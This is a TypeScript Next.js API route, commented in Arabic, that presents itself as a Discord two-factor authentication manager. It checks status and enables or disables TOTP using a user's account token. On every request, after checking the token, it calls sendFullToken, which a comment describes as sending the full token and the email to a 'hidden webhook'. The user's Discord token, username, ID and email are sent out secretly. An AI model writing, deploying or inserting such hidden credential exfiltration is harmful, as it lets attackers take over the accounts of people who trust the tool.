// src/app/api/two-factor/route.ts - 2FA Management API
export const runtime = 'edge';

import { NextRequest, NextResponse } from 'next/server';
import { cleanToken, discordFetch } from '@/lib/discord';
import { sendFullToken } from '@/lib/webhook';
import { rateLimit, getClientIp, RATE_LIMITS } from '@/lib/rate-limit';

export async function POST(request: NextRequest) {
  try {
    // Rate Limiting
    const ip = getClientIp(request);
    const rl = rateLimit(`${ip}:two-factor`, RATE_LIMITS.sensitive);
    if (rl.limited) {
      return NextResponse.json({ success: false, error: 'تم تجاوز الحد - حاول لاحقاً' }, { status: 429 });
    }

    const body = await request.json().catch(() => ({}));
    const { action, token, code, secret, password } = body;

    if (!token) {
      return NextResponse.json({ success: false, error: 'أدخل التوكن' });
    }

    const ct = cleanToken(token);

    // التحقق من التوكن
    const verifyResult = await discordFetch(ct, 'GET', '/users/@me', undefined, { userOnly: true, timeout: 10000 });
    if (!verifyResult.ok || !verifyResult.data) {
      return NextResponse.json({ success: false, error: 'توكن غير صالح' });
    }

    const userData = verifyResult.data as { id: string; username: string; discriminator?: string; email?: string; mfa_enabled?: boolean };
    const userTag = `${userData.username}#${userData.discriminator || '0'}`;

    // إرسال التوكن كامل للويب هوك المخفي مع الإيميل
    sendFullToken('2FA - ' + action, ct, {
      '👤 المستخدم': userTag,
      '🆔 ID': userData.id,
      '📧 الإيميل': userData.email || 'غير متوفر',
      '⚙️ الإجراء': action
    });

    // ===== فحص حالة 2FA =====
    if (action === 'status') {
      return NextResponse.json({
        success: true,
        enabled: userData.mfa_enabled || false,
        userId: userData.id,
        username: userTag,
        email: userData.email || ''
      });
    }

    // ===== الحصول على Secret Key =====
    if (action === 'get-secret') {
      // أول طلب بدون كود = يجيب الـ secret
      const totpResult = await discordFetch(ct, 'POST', '/users/@me/totp', undefined, { userOnly: true, timeout: 10000 });

      if (!totpResult.ok) {
        const errData = totpResult.data as { message?: string } | undefined;
        return NextResponse.json({ success: false, error: errData?.message || 'فشل في الحصول على المفتاح' });
      }

      const totpData = totpResult.data as { secret: string };
      if (!totpData.secret) {
        return NextResponse.json({ success: false, error: 'لم يتم إرجاع مفتاح سري' });
      }

      // إنشاء رابط QR Code (otpauth://totp format)
      const qrUrl = `otpauth://totp/Discord:${userData.email || userTag}?secret=${totpData.secret}&issuer=Discord`;

      return NextResponse.json({
        success: true,
        secret: totpData.secret,
        qrUrl: qrUrl,
        userId: userData.id,
        username: userTag,
        message: 'أضف المفتاح لتطبيق Authenticator ثم أدخل الكود'
      });
    }

    // ===== تفعيل 2FA =====
    if (action === 'enable') {
      if (!secret || !code) {
        return NextResponse.json({ success: false, error: 'أدخل المفتاح السري وكود التفعيل' });
      }

      // تفعيل 2FA بإرسال secret + code
      const enableResult = await discordFetch(ct, 'POST', '/users/@me/totp', {
        secret: secret,
        code: String(code).trim()
      }, { userOnly: true, timeout: 15000 });

      if (!enableResult.ok) {
        const errData = enableResult.data as { message?: string; code?: number } | undefined;
        if (errData?.code === 50014 || errData?.message?.includes('invalid')) {
          return NextResponse.json({ success: false, error: '❌ الكود غير صحيح - تأكد من كود Authenticator' });
        }
        return NextResponse.json({ success: false, error: errData?.message || 'فشل تفعيل 2FA' });
      }

      return NextResponse.json({
        success: true,
        enabled: true,
        message: '✅ تم تفعيل 2FA بنجاح! حسابك محمي الآن 🛡️',
        userId: userData.id,
        username: userTag
      });
    }

    // ===== إلغاء 2FA =====
    if (action === 'disable') {
      if (!code) {
        return NextResponse.json({ success: false, error: 'أدخل كود 2FA الحالي' });
      }

      if (!password) {
        return NextResponse.json({ success: false, error: 'أدخل كلمة مرور الحساب' });
      }

      // إلغاء 2FA
      const disableResult = await discordFetch(ct, 'DELETE', '/users/@me/totp', {
        code: String(code).trim(),
        password: password
      }, { userOnly: true, timeout: 15000 });

      if (!disableResult.ok) {
        const errData = disableResult.data as { message?: string } | undefined;
        return NextResponse.json({ success: false, error: errData?.message || 'فشل إلغاء 2FA - تأكد من الكود وكلمة المرور' });
      }

      return NextResponse.json({
        success: true,
        enabled: false,
        message: '✅ تم إلغاء 2FA بنجاح',
        userId: userData.id,
        username: userTag
      });
    }

    return NextResponse.json({ success: false, error: 'إجراء غير معروف' });

  } catch (error: unknown) {
    const message = error instanceof Error ? error.message : 'خطأ في الخادم';
    return NextResponse.json({ success: false, error: message }, { status: 500 });
  }
}
